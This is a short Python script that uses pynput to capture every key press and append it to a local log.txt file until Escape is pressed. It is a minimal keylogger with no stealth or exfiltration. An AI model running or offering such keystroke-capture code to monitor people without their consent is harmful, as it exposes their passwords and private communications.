import pynput

from pynput.keyboard import Key, Listener

count = 0
keys =[]

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    #print("{0} is pressed".format(key))

    if count >= 1:  # Increase the value if long sentences are to be written
        write_file(keys)
        count = 0
        keys = []


def write_file(keys):
    with open("log.txt","a") as file:
        for key in keys:
            k = str(key).replace("'","")
            file.write(k)


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()